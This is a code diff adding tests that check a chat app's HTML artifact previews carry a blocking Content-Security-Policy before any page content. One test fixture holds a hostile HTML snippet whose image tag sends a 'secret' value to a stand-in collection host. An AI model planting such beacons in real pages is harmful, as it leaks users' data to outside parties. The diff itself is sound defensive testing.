@@ -20,9 +20,10 @@ import {
   rangeOf,
   sortArtifacts,
 } from "@agenteschat/client/lib/drive";
+import { PAGE_CSP } from "@agenteschat/client/lib/isolated-page";
 import { act, cleanup, fireEvent, render, within } from "@testing-library/react";
 import { fileSaver } from "@/components/artifacts/ArtifactViewer";
-import { HTML_SANDBOX, withShim } from "@/components/artifacts/HtmlFrame";
+import { HTML_SANDBOX, HtmlFrame, withShim } from "@/components/artifacts/HtmlFrame";
 import { setMermaidRenderer } from "@/components/artifacts/Mermaid";
 import { Markdown, parseMarkdown } from "@/lib/markdown";
 import { ATLAS_ID, createFakeApi, ENG_ID, ORG_ID, seedState } from "./fake-api";
@@ -914,5 +915,35 @@ describe("html shim", () => {
     expect(page.indexOf("Content-Security-Policy")).toBeLessThan(page.indexOf("<script>"));
     expect(page.indexOf("<script>")).toBeLessThan(page.indexOf("<title>"));
     expect(withShim("<h1>a</h1>").indexOf("<script>")).toBeLessThan(withShim("<h1>a</h1>").indexOf("<h1>"));
+  });
+
+  test("a chat card's preview loads nothing from the network, its policy before anything of the page", () => {
+    const hostile = `<!doctype html><img src="https://collect.example.net/?d=secret"><html><head><title>x</title></head></html>`;
+    const preview = withShim(hostile);
+    const policy = `<meta http-equiv="Content-Security-Policy" content="${PAGE_CSP}">`;
+    expect(preview.indexOf(policy)).toBeGreaterThan(-1);
+    expect(preview.indexOf(policy)).toBeLessThan(preview.indexOf("<img"));
+    expect(preview.indexOf(policy)).toBeLessThan(preview.indexOf("<script>"));
+    expect(PAGE_CSP).toContain("default-src 'none'");
+    expect(PAGE_CSP).not.toContain("http");
+  });
+
+  test("the card's frame loads the page behind the policy", async () => {
+    const pages: Blob[] = [];
+    const create = URL.createObjectURL;
+    URL.createObjectURL = (b: Blob | MediaSource) => {
+      pages.push(b as Blob);
+      return `blob:page-${pages.length}`;
+    };
+    try {
+      const html = "<!doctype html><html><head></head><body>x</body></html>";
+      render(<HtmlFrame html={html} title="card" thumbnail />);
+      await settle(1);
+      const card = await pages[0]?.text();
+      expect(card?.indexOf(PAGE_CSP)).toBeGreaterThan(-1);
+      expect(card?.indexOf(PAGE_CSP)).toBeLessThan(card?.indexOf("<body>") ?? -1);
+    } finally {
+      URL.createObjectURL = create;
+    }
   });
 });
